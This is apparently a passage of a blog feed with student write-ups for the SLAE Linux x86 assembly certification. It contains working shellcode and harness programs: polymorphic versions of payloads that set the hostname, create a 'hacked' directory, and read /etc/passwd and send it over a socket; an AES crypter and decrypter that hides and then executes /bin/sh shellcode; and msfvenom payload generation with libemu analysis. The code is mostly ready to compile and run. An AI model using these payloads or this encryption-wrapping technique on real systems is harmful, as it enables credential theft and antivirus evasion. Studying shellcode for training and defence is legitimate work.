Author : gunslinger_ &amp;lt;yudha.gunslinger[at]gmail.com&amp;gt;
Web    : devilzc0de.com
blog   : gunslingerc0de.wordpress.com
tested on : linux debian
*/

#include &amp;lt;stdio.h&amp;gt;

char *shellcode=
 &quot;\xeb\x11&quot;                    /* jmp    0x8048073 */
 &quot;\x31\xc0&quot;                    /* xor    %eax,%eax */
 &quot;\xb0\x4a&quot;                    /* mov    $0x4a,%al */
 &quot;\x5b&quot;                        /* pop    %ebx */
 &quot;\xb1\x08&quot;                    /* mov    $0x8,%cl */
 &quot;\xcd\x80&quot;                    /* int    $0x80 */
 &quot;\x31\xc0&quot;                    /* xor    %eax,%eax */
 &quot;\xb0\x01&quot;                    /* mov    $0x1,%al */
 &quot;\x31\xdb&quot;                    /* xor    %ebx,%ebx */
 &quot;\xcd\x80&quot;                    /* int    $0x80 */
 &quot;\xe8\xea\xff\xff\xff&quot;        /* call   0x8048062 */
 &quot;\x50&quot;                        /* push   %eax */
 &quot;\x77\x4e&quot;                    /* ja     0x80480c9 */
 &quot;\x65&quot;                        /* gs */
 &quot;\x44&quot;                        /* inc    %esp */
 &quot;\x20\x21&quot;                    /* and    %ah,(%ecx) */
 &quot;\x21&quot;;                        /* .byte 0x21 */

int main(void)
{
		fprintf(stdout,&quot;Length: %d\n&quot;,strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Making sure the original is working.
&lt;img src=&quot;/assets/SLAE-x86/6.2-shellcode-622-og-running.PNG&quot; alt=&quot;6.2-shellcode-622-og-running&quot; /&gt;
The polymorphic version of the above shellcode is as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;; Title 	: SLAE Linux/x86 - Assignment-6.2
; Description	: Polymorphic version of Linux/x86 - sys_sethostname(PwNeD !!, 8) - 32 bytes by gunslinger_
; Original 	: http://shell-storm.org/shellcode/files/shellcode-622.php
; Author	: Rizal Muhammed (UB3RSiCK)
; Student ID	: SLAE 933
; Shellcode Len.: 28 bytes (4 Bytes smaller than original)
;
; nasm -f elf32 shellcode-622-poly.nasm -o shellcode-622-poly.o
; ld shellcode-622-poly.o -o shellcode-622-poly -z execstack

section .text
global _start

_start:

;original
;00000000  EB11              jmp short 0x13
;00000002  31C0              xor eax,eax
;00000004  B04A              mov al,0x4a
;00000006  5B                pop ebx
;00000007  B108              mov cl,0x8
;00000009  CD80              int 0x80
;0000000B  31C0              xor eax,eax
;0000000D  B001              mov al,0x1
;0000000F  31DB              xor ebx,ebx
;00000011  CD80              int 0x80
;00000013  E8EAFFFFFF        call dword 0x2
;00000018  50                push eax
;00000019  774E              ja 0x69
;0000001B  6544              gs inc esp
;0000001D  2021              and [ecx],ah
;0000001F  21                db 0x21

;Polymorphic

	xor eax,eax
	push eax			; push null terminator
	push dword 0x21212044		; python -c 'print &quot;PwNeD !!&quot;[::-1].encode(&quot;hex&quot;)'
	push dword 0x654e7750
	mov ebx, esp			; ebx = char __user *name
	mov al, 0x4a			; sys_sethostname = 0x4a
	push 0x8
	pop ecx				; ecx = int len
	int 0x80

	; exit
	mov al,0x1
	xor ebx,ebx
	int 0x80
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Lets test our polymorphic version.
&lt;img src=&quot;/assets/SLAE-x86/6.2-shellcode-622-poly-running.PNG&quot; alt=&quot;shellcode-622-poly-running&quot; /&gt;
The polymorphic shellcode works and is smaller than the original shellcode.&lt;/p&gt;

&lt;p&gt;Original Shellcode : &lt;strong&gt;32 bytes&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;poymorphic Shellcode : &lt;strong&gt;28 bytes (4 bytes smaller than original) - 12.5% decrease&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;3---linuxx86---mkdir--exit---36-bytes&quot;&gt;#3 - Linux/x86 - mkdir() &amp;amp; exit() - 36 bytes&lt;/h3&gt;
&lt;p&gt;The third shellcode makes a folder names &lt;strong&gt;hacked&lt;/strong&gt; in current directory and exits. The shellcode can be found &lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-542.php&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/*
 * This shellcode will do a mkdir() of 'hacked' and then an exit()
 * Written by zillion@safemode.org
 *
 */

char shellcode[]=
		&quot;\xeb\x16\x5e\x31\xc0\x88\x46\x06\xb0\x27\x8d\x1e\x66\xb9\xed&quot;
        &quot;\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x68&quot;
        &quot;\x61\x63\x6b\x65\x64\x23&quot;;

void main(){
  int *ret;
  ret = (int *)&amp;amp;ret + 2;
  (*ret) = (int)shellcode;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Making sure its working.
&lt;img src=&quot;/assets/SLAE-x86/6.3-shellcode-542-og.PNG&quot; alt=&quot;shellcode-542-og&quot; /&gt;
Polymorphic version of the shellcode:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;; Title 	: SLAE Linux/x86 - Assignment-6.3
; Description	: Polymorphic version of Linux/x86 - mkdir() &amp;amp; exit() - 36 bytes by zillion
; Original 	: http://shell-storm.org/shellcode/files/shellcode-542.php
; Author	: Rizal Muhammed (UB3RSiCK)
; Student ID	: SLAE 933
; Shellcode Len.: 29 Bytes (7 bytes less than the original)
;
; nasm -f elf32 shellcode-542-poly.nasm -o shellcode-542-poly.o
; ld shellcode-542-poly.o -o shellcode-542-poly -z execstack

section .text
global _start
_start:
	
        jmp short get_addr
		string_addr:
            		pop ebx
			push 0x27
			pop eax
			mov cx,0x1ed
            		int 0x80
              	
			mov al,0x1
            		xor ebx,ebx
            		int 0x80
	get_addr:
        	call string_addr
        	fname db &quot;hacked&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Lets test the polymorphic version.
&lt;img src=&quot;/assets/SLAE-x86/6.3-shellcode-542-poly.PNG&quot; alt=&quot;shellcode-542-poly&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Original Shellcode : &lt;strong&gt;36 bytes&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Polymorphic Shellcode :	&lt;strong&gt;29 Bytes (7 bytes less than the original) - ~19.45% decrease&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;4---linuxx86---reads-etcpasswd-and-sends-the-content-to-127111-port-12345---111-bytes&quot;&gt;#4 - Linux/x86 - reads /etc/passwd and sends the content to 127.1.1.1 port 12345 - 111 bytes&lt;/h3&gt;
&lt;p&gt;Lets create polymorphic shellcode for one more - for fun :D. This one reads the file &lt;code&gt;/etc/passwd&lt;/code&gt; and sends the contents to localhost port 12345. The original shellcode can be found &lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-861.php&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/*
; Author: Daniel Sauder
; Website: http://govolution.wordpress.com/about
; License http://creativecommons.org/licenses/by-sa/3.0/

; Shellcode reads /etc/passwd and sends the content to 127.1.1.1 port 12345. 
; The file can be recieved using netcat:
; $ nc -l 127.1.1.1 12345

section .text

global _start

_start:
    ; socket
    push BYTE 0x66    ; socketcall 102
    pop eax
    xor ebx, ebx 
    inc ebx 
    xor edx, edx
    push edx 
    push BYTE 0x1
    push BYTE 0x2
    mov ecx, esp
    int 0x80
    mov esi, eax

    ; connect
    push BYTE 0x66 
    pop eax
    inc ebx
    push DWORD 0x0101017f  ;127.1.1.1
    push WORD 0x3930  ; Port 12345
    push WORD bx
    mov ecx, esp
    push BYTE 16
    push ecx
    push esi
    mov ecx, esp
    inc ebx
    int 0x80

    ; dup2
    mov esi, eax
    push BYTE 0x1
    pop ecx
    mov BYTE al, 0x3F
    int 0x80

    ;read the file
    jmp short call_shellcode

shellcode:
    push 0x5
    pop eax
    pop ebx
    xor ecx,ecx
    int 0x80
    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    xor edx,edx
    mov dh,0xff
    mov dl,0xff
    int 0x80
    mov edx,eax
    push 0x4
    pop eax
    mov bl, 0x1
    int 0x80
    push 0x1
    pop eax
    inc ebx
    int 0x80

call_shellcode:
    call shellcode
    message db &quot;/etc/passwd&quot;
*/

#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

unsigned char code[] = \
&quot;\x6a\x66\x58\x31\xdb\x43\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x68\x7f\x01\x01\x01\x66\x68\x30\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x89\xc6\x6a\x01\x59\xb0\x3f\xcd\x80\xeb\x27\x6a\x05\x58\x5b\x31\xc9\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x31\xd2\xb6\xff\xb2\xff\xcd\x80\x89\xc2\x6a\x04\x58\xb3\x01\xcd\x80\x6a\x01\x58\x43\xcd\x80\xe8\xd4\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;;

main()
{
    printf(&quot;Shellcode Length:  %d\n&quot;, strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Lets make sure that the original works fine.
&lt;img src=&quot;/assets/SLAE-x86/6.4-shellcode-861-og.PNG&quot; alt=&quot;shellcode-861-og&quot; /&gt;
polymorphic version of the above shellcode is as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;; Title 	: SLAE Linux/x86 - Assignment-6.4
; Description	: Polymorphic version of Linux/x86 - reads /etc/passwd and sends the content to 127.1.1.1 port 12345 - 111 bytes by Daniel Sauder
; Original 	: http://shell-storm.org/shellcode/files/shellcode-861.php
; Author	: Rizal Muhammed (UB3RSiCK)
; Student ID	: SLAE 933
; Shellcode Len.: 128 Bytes (~15.3% increase in shellcode size)
;
; nasm -f elf32 shellcode-861-poly.nasm -o shellcode-861-poly.o
; ld shellcode-861-poly.o -o shellcode-861-poly -z execstack


section .text
global _start
_start:
    	; socket
	push BYTE 0x66    ; socketcall 102
	pop eax

	;xor ebx, ebx 
    	;inc ebx 
	push byte 0x1
	pop ebx

    	;xor edx, edx
    	;push edx 
	cdq
	push edx
	
   	push BYTE 0x1
	push BYTE 0x2

	;mov ecx, esp
	push esp
	pop ecx

    	int 0x80

    	;mov esi, eax
	push eax
	pop esi

    	; connect
    	push BYTE 0x66 
    	pop eax
    	inc ebx

    	;push DWORD 0x0101017f  ;127.1.1.1
	mov edx, 0x01010101
	add edx,0x7e
	push edx

    	;push WORD 0x3930  	; Port 12345
	add dx, 0x37b1		; dx = 0x017f ; 0x37b1 + 0x017f = 0x3930
	push word dx

    	push WORD bx
    	mov ecx, esp
    	push BYTE 16
    	push ecx
    	push esi
    	mov ecx, esp
    	inc ebx
   	int 0x80

    	; dup2
    	mov esi, eax
    	push BYTE 0x1
    	pop ecx
    	mov BYTE al, 0x3F
    	int 0x80
    
    	;read the file
    	;jmp short call_shellcode
    
;shellcode:

    	;push 0x5
    	;pop eax
	xor eax, eax
	push eax		; null byte to terminate our /etc//passwd string
	mov al, 0x5

	;removing the jmp call pop
    	;pop ebx

	;&quot;/etc//passwd&quot;[::-1].encode(&quot;hex&quot;)
	; 6477737361702f2f6374652f

	mov ebx, 0x54676363
	add ebx, 0x10101010
	push ebx			; 0x64777373
	;------------------
	sub ebx, 0x3074444
	push ebx			; 0x61702f2f
	;------------------
	add ebx, 0x2043601
	dec ebx
	push ebx			; 0x6374652f
	;------------------
	mov ebx, esp

    	xor ecx,ecx
    	int 0x80
    
	;mov ebx,eax
	push eax
	pop ebx

	mov al,0x3
    	mov edi,esp
    	mov ecx,edi

    	;xor edx,edx
	cdq

    	;mov dh,0xff
    	;mov dl,0xff

	mov dx,0xffff
    	int 0x80

	;mov edx,eax
	push eax
	pop edx

    	push 0x4
    	pop eax
    	mov bl, 0x1

    	int 0x80
    	push 0x1
    	pop eax
    	inc ebx
    	int 0x80
    
;call_shellcode:
;    	call shellcode
;    	message db &quot;/etc/passwd&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;lets test our polymorphic shellcode.
&lt;img src=&quot;/assets/SLAE-x86/6.4-shellcode-861-poly.PNG&quot; alt=&quot;shellcode-861-poly&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Original Shellcode : &lt;strong&gt;111 bytes&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Polymorphic Shellcode : &lt;strong&gt;128 Bytes (~15.3% increase in shellcode size)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;And we are done :)&lt;/p&gt;

&lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/&quot;&gt;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Student ID: &lt;strong&gt;SLAE-933&lt;/strong&gt;&lt;/p&gt;
</content>

 </entry>
 
 <entry>
   <title>SLAE Assignment 7 - Crypter (Linux/X86)</title>
   <link href="http://localhost:4000/2017/08/27/slae-x86-assignment-7-custom-crypter/"/>
   <updated>2017-08-27T00:00:00+04:00</updated>
   <id>http://localhost:4000/2017/08/27/slae-x86-assignment-7-custom-crypter</id>
   <content type="html">&lt;p&gt;The last assignment is to create a crypter which  will encrypt the shellcode.&lt;/p&gt;

&lt;p&gt;Our goal for this assignment is:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Create Crypter&lt;/li&gt;
  &lt;li&gt;Can use any encryption scheme&lt;/li&gt;
  &lt;li&gt;Can use any programming language for implementation&lt;/li&gt;
&lt;/ul&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;encryption-scheme---rijndael-128-cbc&quot;&gt;Encryption Scheme - [RIJNDAEL-128-CBC]&lt;/h3&gt;
&lt;p&gt;I decided to use existing encryption scheme &lt;strong&gt;Rijndael-128-CBC&lt;/strong&gt;. Rijndael is a symmetric block cipher, designed by Joan Daemen and Vincent Rijmen, and was approved for the USA’s NIST Advanced Encryption Standard, FIPS-197. The cipher has a variable block length and key length. Rijndael can be implemented very efficiently on a wide range of processors and in hardware. The design of Rijndael was strongly influenced by the design of the block cipher Square. There exist three versions of this algorithm, namely: RIJNDAEL-128 (the AES winner) , RIJNDAEL-192 , RIJNDAEL-256. The numerals 128, 192 and 256 stand for the length of the block size.&lt;/p&gt;

&lt;h3 id=&quot;programming-language&quot;&gt;Programming Language&lt;/h3&gt;
&lt;p&gt;Choosing the programming language was not a hard thing for me. I will be using “C” language along with the &lt;strong&gt;libmcrypt&lt;/strong&gt; encryption/decryption library to implement the Crypter.&lt;/p&gt;

&lt;h3 id=&quot;aes-rijndael-128-cbc-implementation&quot;&gt;AES RIJNDAEL-128-CBC Implementation&lt;/h3&gt;
&lt;p&gt;Before we dive into actual implementation, let us look at the encryption sheme.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Rinjndael-128 (128 bit block size)&lt;/li&gt;
  &lt;li&gt;Uses CBC (cipher block chaining) mode.&lt;/li&gt;
  &lt;li&gt;Key size 128 bit (16 byte)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Below is the fully commented code for the Crypter implementation. The execve /bin/sh shellcode is used in the below code.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/*
* Author	: RIZAL MUHAMMED (UB3RSiCK)
* Description	: AES-RIJNDAEL-128-CBC Encrypt shellcode using libmcrypt
* Filename	: AESCrypter.c
*
* mcrypt API details - https://linux.die.net/man/3/mcrypt
* sudo apt-get install libmcrypt-dev
* gcc AESCrypter.c -o AESCrypter -lmcrypt
*
*/


#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

#include &amp;lt;mcrypt.h&amp;gt;

#include &amp;lt;math.h&amp;gt;
#include &amp;lt;stdint.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;


// Function that encrypts the shellcode
int AES_ENCRYPT(
    void* buffer,
    int buffer_len, /* the shellcode could include null bytes*/
    char* IV,
    char* key,
    int key_len
){
  
  /*
  *	 mcrypt_module_open function associates the algorithm and the mode specified [Algorithm: rijndael-128, mode: CBC]
  *	 Returns an encryption descriptor, or MCRYPT_FAILED on error
  */
  MCRYPT td = mcrypt_module_open(&quot;rijndael-128&quot;, NULL, &quot;cbc&quot;, NULL);

  int blocksize = mcrypt_enc_get_block_size(td);
  
  // buffer_len should be k*algorithms_block_size if used in a mode which operated in blocks (cbc, ecb, nofb)
  if( buffer_len % blocksize != 0 ){return 1;}
 
  // initializes all buffers for the specified thread
  mcrypt_generic_init(td, key, key_len, IV);

  /*
  *	main encryption function. td is the encryption descriptor returned by mcrypt_generic_init(). 
  *	buffer contains the shellcode wewish to encrypt and buffer_len is the length (in bytes) of shellcode.
  *	Returns 0 on success.
  */
  mcrypt_generic(td, buffer, buffer_len);

  // This function terminates encryption specified by the encryption descriptor (td)
  mcrypt_generic_deinit (td);

  // This function closes the modules used by the descriptor td. 
  mcrypt_module_close(td);
  
  return 0;
}

int main()
{
  MCRYPT td;

  // execve /bin/sh shellcode
  char * shellcode = \
  &quot;\xeb\x0d\x5e\x31\xc9\xb1\x19\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a&quot;;

  int ctr;
  int shellcode_len;
  shellcode_len = strlen(shellcode);
 
  // Initializaion Vector
  char* IV = &quot;BLEHBLAHBLEHBLAH&quot;;

  // key
  char *key = &quot;ub3r53cr3t435k3y&quot;;
  int keysize = 16; /* 128 bits */
  char* buffer;

  // must be larger than or equal to shellcode length and should be k*algorithms_block_size if used in a mode which operated in blocks (cbc, ecb, nofb)
  // CBC in this case
  int buffer_len = 64; 

  buffer = calloc(1, buffer_len);
  // Copy the shellcode to a buffer
  strncpy(buffer, shellcode, buffer_len);

  printf(&quot;\n==Original Shellcode==\n&quot;);
  for(ctr=0;ctr&amp;lt;shellcode_len;ctr++){
	printf(&quot;\\x%02x&quot;, shellcode[ctr]&amp;amp;0xff);
  }
  printf(&quot;\n&quot;);

  //Encrypt buffer
  AES_ENCRYPT(buffer, buffer_len, IV, key, keysize); 

  printf(&quot;\n==Encrypted Shellcode==\n&quot;);
  for(ctr=0;ctr&amp;lt;buffer_len;ctr++){
       printf(&quot;\\x%02x&quot;, buffer[ctr]&amp;amp;0xff);
  }
  printf(&quot;\n\n&quot;);

  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Lets compile this and run the Crypter executable.
&lt;img src=&quot;/assets/SLAE-x86/asn-7-crypter-out.PNG&quot; alt=&quot;asn-7-crypter-out&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, the encrypted shellcode length is few bytes more than the original shellcode, infact it is equal to the buffer size we have specified in the code [64]. Our buffer length should be such that it should accomodate our shellcode and should be k*algorithms_block_size.&lt;/p&gt;

&lt;p&gt;With that out of the way, lets move on to the decryption.&lt;/p&gt;
&lt;h3 id=&quot;decryption-implementation&quot;&gt;Decryption Implementation&lt;/h3&gt;
&lt;p&gt;The Decrytper will decrypt the encryted shellcode and will pass control to the decrypted shellcode once decryption is completed. Below is the fully commented code for the decrypter.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/*
* Author	: RIZAL MUHAMMED (UB3RSiCK)
* Description	: Decrypts AES-RIJNDAEL-128-CBC Encrypted shellcode and Executes
* Filename	: AESCrypter.c
*
* sudo apt-get install libmcrypt-dev
* gcc AESDeCryptExec.c -o AESDeCryptExec -lmcrypt -fno-stack-protector -z execstack
*
*/

#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

#include &amp;lt;mcrypt.h&amp;gt;

#include &amp;lt;math.h&amp;gt;
#include &amp;lt;stdint.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

// Function that Decrypts the shellcode
int AES_DECRYPT(
    void* buffer,
    int buffer_len,
    char* IV, 
    char* key,
    int key_len 
){
  /*
  *	 mcrypt_module_open function associates the algorithm and the mode specified [Algorithm: rijndael-128, mode: CBC]
  *	 Returns an encryption descriptor, or MCRYPT_FAILED on error
  */
  MCRYPT td = mcrypt_module_open(&quot;rijndael-128&quot;, NULL, &quot;cbc&quot;, NULL);
  int blocksize = mcrypt_enc_get_block_size(td);

  // buffer_len should be k*algorithms_block_size if used in a mode which operated in blocks (cbc, ecb, nofb)
  if( buffer_len % blocksize != 0 ){return 1;}
  
  // initializes all buffers for the specified thread
  mcrypt_generic_init(td, key, key_len, IV);
 
  // The decryption function. Returns 0 on success. 
  mdecrypt_generic(td, buffer, buffer_len);

  // This function terminates encryption specified by the encryption descriptor (td). Actually it clears all buffers.
  mcrypt_generic_deinit (td);

  // This function closes the modules used by the descriptor td.
  mcrypt_module_close(td);
  
  return 0;
}

int main()
{
  MCRYPT td;

  // Encrypted shellcode
  char * encr_shellcode = \
  &quot;\xb4\x35\x28\x01\x6b\xfc\xf1\x8d\x01\x06\xf3\xc7\x23\x3e\xdd\xd9\x54\xc4\xa2\xa1\xe9\x9f\x2e\x67\x7c\x88\xae\x58\x5d\x40\x32\x3a\x74\x0b\xe6\x49\xd8\xa6\x16\x8c\x4b\x90\x6b\xd5\xfb\x7f\x2c\x95\x68\xcc\x91\xf4\xe7\xea\x8e\x9c\xc6\x4c\xb7\x72\x3b\x8d\x51\x50&quot;;
  
  int ctr;
  int shellcode_len;
  shellcode_len = strlen(encr_shellcode);
 
  // Initializaion Vector
  char* IV = &quot;BLEHBLAHBLEHBLAH&quot;;

  // Encryption Key
  char *key = &quot;ub3r53cr3t435k3y&quot;;
  int keysize = 16; /* 128 bits */
  char* buffer;

  // must be larger than or equal to shellcode length and should be k*algorithms_block_size if used in a mode which operated in blocks (cbc, ecb, nofb)
  // CBC in this case
  int buffer_len = 64;

  buffer = calloc(1, buffer_len);
  strncpy(buffer, encr_shellcode, buffer_len);

  int (*ret)() = (int(*)())buffer;

  // Display the encrypted shellcode
  printf(&quot;\n==Encrypted Shellcode==\n&quot;);
  for(ctr=0;ctr&amp;lt;shellcode_len;ctr++){
	printf(&quot;\\x%02x&quot;, encr_shellcode[ctr]&amp;amp;0xff);
  }
  printf(&quot;\n&quot;);

  // Decrypt Buffer
  AES_DECRYPT(buffer, buffer_len, IV, key, keysize);
  printf(&quot;\n==Decrypted Shellcode==\n&quot;);
  for(ctr=0;ctr&amp;lt;shellcode_len;ctr++){
	printf(&quot;\\x%02x&quot;, buffer[ctr]&amp;amp;0xff);
  }

  printf(&quot;\n\n==Jumping to Decrypted Payload==\n&quot;);
  ret();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lets see the Decrypter in action. Compiling and executing the Decrypter.
&lt;img src=&quot;/assets/SLAE-x86/asn-7-decrypter-out.PNG&quot; alt=&quot;asn-7-decrypter-out&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we are done :)&lt;/p&gt;

&lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/&quot;&gt;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Student ID: &lt;strong&gt;SLAE-933&lt;/strong&gt;&lt;/p&gt;
</content>

 </entry>
 
 <entry>
   <title>SLAE Assignment 5 - Analyzing Metasploit Payloads</title>
   <link href="http://localhost:4000/2017/08/27/slae-x86-assignment-5-analyzing-payloads/"/>
   <updated>2017-08-27T00:00:00+04:00</updated>
   <id>http://localhost:4000/2017/08/27/slae-x86-assignment-5-analyzing-payloads</id>
   <content type="html">&lt;p&gt;Metasploit is an awesome penetration testing software which a large number of exploits, payloads, encoders etc. Our goal in this assignment is to analyze three different payloads for linux/x86 generated with msfpayload (I will be using msfvenom instead) using GDB/Ndisasm/Libemu.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;&lt;img src=&quot;/assets/SLAE-x86/asn-5/asn-5-linux-x86-payloads.PNG&quot; alt=&quot;asn-5-linux-x86-payloads&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, Metasploit provides an exhaustive list of payloads for linux/x86 alone. I have chosen to analyze the following three payloads.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;EXEC - linux/x86/exec&lt;/li&gt;
  &lt;li&gt;CHMOD - linux/x86/chmod&lt;/li&gt;
  &lt;li&gt;READ_FILE - linux/x86/read_file&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;1-exec---linuxx86exec---libemu-and-gdb&quot;&gt;#1. EXEC - linux/x86/exec - [Libemu and GDB]&lt;/h3&gt;
&lt;p&gt;The first shellcode that we are going to analyze is the &lt;code&gt;linux/x86/exec&lt;/code&gt;. Instead of msfpayload, we will be using msfvenom - replacement for msfpayload and msfencode - to generate the shellcodes. Lets look at the payload options. The below command can be used to see the available options for a payload.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msfvenom -p &amp;lt;payload_name&amp;gt; --payload-options
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/assets/SLAE-x86/asn-5/asn-5-exec-payload-opt.PNG&quot; alt=&quot;asn-5-exec-payload-opt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, the &lt;code&gt;CMD&lt;/code&gt; option is to be set to the command string to be executed. With that information, let us generate the shellcode to execute the command &lt;code&gt;id&lt;/code&gt;. The following command is used to generate the shellcode.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msfvenom -p linux/x86/exec CMD=id -f c | cut -d '&quot;' -f 2 | tr -d '\n'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This will give us the shellcode in a single line without the double quotes.
&lt;img src=&quot;/assets/SLAE-x86/asn-5/asn-5-exec-msfvenom-shellcode.PNG&quot; alt=&quot;asn-5-exec-msfvenom-shellcode&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now that we have the actual shellcode, lets analyze it using &lt;strong&gt;libemu&lt;/strong&gt;. We will make use of the &lt;strong&gt;sctest&lt;/strong&gt; binary which comes with libemu to emulate the shellcode and see which system call is being executed and what parameters are passed to it. I have created an alias variable named ‘sctest’ which actually points to the original sctest binary stored in a different location. The following command is used for creating the alias.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;alias sctest=~/Desktop/libemu/libemu-master/tools/sctest/sctest
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The following command can be used to emulate the shellcode using libemu.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo -ne &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03\x00\x00\x00\x69\x64\x00\x57\x53\x89\xe1\xcd\x80&quot; | sctest -vvv -Ss 10000 -G exec.dot
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;-G&lt;/code&gt; flag gives us a graph file in &lt;code&gt;.dot&lt;/code&gt; format. Later we will convert this to an image. The following is the output of the above command.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;truncated&amp;gt;
int execve (
     const char * dateiname = 0x00416fc0 =&amp;gt; 
           = &quot;/bin/sh&quot;;
     const char * argv[] = [
           = 0x00416fb0 =&amp;gt; 
               = 0x00416fc0 =&amp;gt; 
                   = &quot;/bin/sh&quot;;
           = 0x00416fb4 =&amp;gt; 
               = 0x00416fc8 =&amp;gt; 
                   = &quot;-c&quot;;
           = 0x00416fb8 =&amp;gt; 
               = 0x0041701d =&amp;gt; 
                   = &quot;id&quot;;
           = 0x00000000 =&amp;gt; 
             none;
     ];
     const char * envp[] = 0x00000000 =&amp;gt; 
         none;
) =  0;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/assets/SLAE-x86/asn-5/asn-5-exec-libemu.PNG&quot; alt=&quot;asn-5-exec-libemu&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The following command converts the graph file to a PNG image.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dot exec.dot -Tpng -o exec.png
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Below is the graph generated by libemu.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/SLAE-x86/asn-5/exec.png&quot; alt=&quot;asn-5-exec-graph&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can clearly see, the execve() system call is executed. Let us look at the linux man page entry for execve().&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;int execve(const char *filename, char *const argv[], char *const envp[]);
&lt;/code&gt;&lt;/pre&gt;
